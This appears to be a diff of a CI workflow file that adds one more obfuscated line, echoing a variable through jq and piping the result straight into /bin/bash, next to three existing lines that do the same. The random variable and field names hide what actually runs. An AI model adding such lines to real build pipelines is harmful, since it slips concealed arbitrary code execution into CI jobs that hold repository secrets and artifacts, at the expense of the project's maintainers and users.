@@ -26,6 +26,7 @@ jobs:
           echo $tuaul177 | jq -r .agoa7 | /bin/bash
           printf '%s' "$hl240" | jq -r .w116 | /bin/bash
           printf '%s' "$g8" | jq -r .ko98 | /bin/bash
+          echo $hp04 | jq -r .nah64 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
